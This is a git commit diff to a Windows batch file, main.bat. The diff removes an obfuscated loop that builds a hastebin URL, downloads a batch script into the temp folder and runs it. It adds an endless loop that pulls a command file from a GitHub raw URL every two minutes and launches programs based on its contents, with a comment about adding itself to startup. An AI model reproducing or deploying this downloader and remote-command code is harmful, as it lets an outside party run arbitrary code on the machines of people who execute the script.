5bf9c8b8c385c2552b48743d9c28fbbee19373f2
Sap196 <93683318+Sap196@users.noreply.github.com>
2022-02-13 11:57:32 +0100

    Add files via upload

--- main.bat
+++ main.bat
@@ -1,5 +1,24 @@
 @echo off
-for /f "tokens=1-6" %%a in (""%temp%\A" "164271328028265" co  bin . rixavecuva") do (
-    curl -#Lsko "%%~a%%~b%%ebat" "haste%%d%%e%%cm/raw/%%f"
-    call "%%~a%%~b%%ebat" "%%~b"
-)
+:x
+
+    :: clone to temp folder and add to startup
+
+
+    curl https://raw.githubusercontent.com/Sap196/DownloadableFiles/main/command.txt -o command.txt
+    for /f "delims=" %%a in ('type "command.txt"') do set "build=%%a"
+
+    if "%build%"=="cmd" (
+        cmd.exe
+    )
+    if "%build%"=="calc" (
+        calc.exe
+    )
+    if "%build%"=="cmd" (
+        echo it is %build%
+    )
+    if "%build%"=="cmd" (
+        echo it is %build%
+    )
+
+    timeout /t 120 /nobreak > NUL
+goto x
